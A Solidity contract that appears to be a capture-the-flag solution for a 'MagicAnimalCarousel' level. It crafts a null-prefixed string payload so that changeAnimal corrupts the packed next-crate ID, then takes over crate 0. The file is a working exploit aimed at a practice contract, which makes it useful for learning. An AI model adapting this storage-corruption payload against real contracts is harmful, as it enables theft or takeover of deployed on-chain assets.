// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../levels/MagicAnimalCarousel.sol";

contract CarouselAttacker {
    MagicAnimalCarousel public carousel;
    
    constructor(address _carousel) {
        carousel = MagicAnimalCarousel(_carousel);
    }
    
    function attack() external {
        // First, create a crate we own
        carousel.setAnimalAndSpin("dog");
        
        // The current crate should now be 2
        uint256 crateId = carousel.currentCrateId();
        
        // Now exploit the bug in changeAnimal
        // We need a string that when placed at bit 160 will set next ID to 0
        // The string needs to have 0x0000 in its first 2 bytes after encoding
        
        // Using a string starting with two null bytes
        bytes memory payload = new bytes(12);
        // First two bytes are 0x00 0x00 to set next ID to 0
        payload[0] = 0x00;
        payload[1] = 0x00;
        // Fill rest with some data
        for(uint i = 2; i < 12; i++) {
            payload[i] = 0x41; // 'A'
        }
        
        carousel.changeAnimal(string(payload), crateId);
        
        // Now the next ID should be 0, spin to access crate 0
        carousel.setAnimalAndSpin("win");
        
        // We should now be at crate 0, change its animal to take control
        carousel.changeAnimal("winner", 0);
    }
}